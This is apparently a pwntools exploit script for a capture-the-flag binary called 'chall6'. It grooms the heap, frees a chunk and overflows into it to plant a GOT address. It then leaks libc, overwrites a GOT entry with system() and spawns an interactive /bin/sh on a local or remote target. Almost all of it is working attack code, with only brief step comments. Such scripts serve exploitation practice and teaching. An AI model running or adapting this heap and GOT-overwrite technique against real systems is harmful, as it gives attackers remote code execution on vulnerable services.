#!/usr/bin/python
from pwn import *
import sys

LOCAL = True
HOST  = ''
PORT  = 12345

GOT   = 0x603038  # the address of strcpy in GOT
LIBC  = 0x18e590  # distance from __strlen_avx2() leak to libc base
SYS   = 0x04f440  # offset from libc base to system()

if len(sys.argv) > 1:
	LOCAL = False
	HOST  = sys.argv[1]

if len(sys.argv) > 2:
	PORT = sys.argv[2]

def add(name, desc, alias=''):

	cmd = 'add'
	if alias:
		cmd += ' '+alias

	io.sendline(cmd)
	io.recvuntil('player: ')
	io.sendline(name)
	io.recvuntil('desc: ')
	io.sendline(desc)

	io.recvuntil(' > ')

def edit(alias, name, desc, score):

	io.sendline('edit '+alias)
	io.recvuntil('player: ')
	io.sendline(name)
	io.recvuntil('desc: ')
	io.sendline(desc)
	io.recvuntil('score: ')
	io.sendline(str(score))

	io.recvuntil(' > ')

def delete(alias):

	io.sendline('del '+alias)

	io.recvuntil(' > ')

if LOCAL:
	io = process('../chall6')
else:
	io = remote(HOST, PORT)

# step 1: make sure the chunk we free is not bordering the top or bottom chunk
add('A'*46, '0'*31, 'aa')
add('B'*46, '1'*31, 'bb')
add('C'*46, '2'*31, 'cc')
add('D'*46, '3'*31, 'dd')

# step 2: free the third struct and string
delete('cc')

# step 3: edit the second string so it ends up where the third struct was
edit('bb', 'B'*46, 'x'*56+p64(GOT), 234)

# step 4: leak addresses
io.sendline('show cc')
io.recvuntil('desc: ')

leak = io.recvline().strip()
func = u64(leak+'\x00\x00')
libc = func - LIBC
log.info('func: 0x%012x' % func)
log.info('libc: 0x%012x' % libc)

# step 5: overwrite strlen() pointer in GOT with system()
edit('cc', 'C'*46, p64(libc+SYS), 234)

# step 6: pop shell
io.sendline('add')
io.recvuntil(': ')
io.sendline('/bin/sh')

io.sendline('id')
log.success('shell: '+io.recvline().strip())
io.interactive()
io.close()
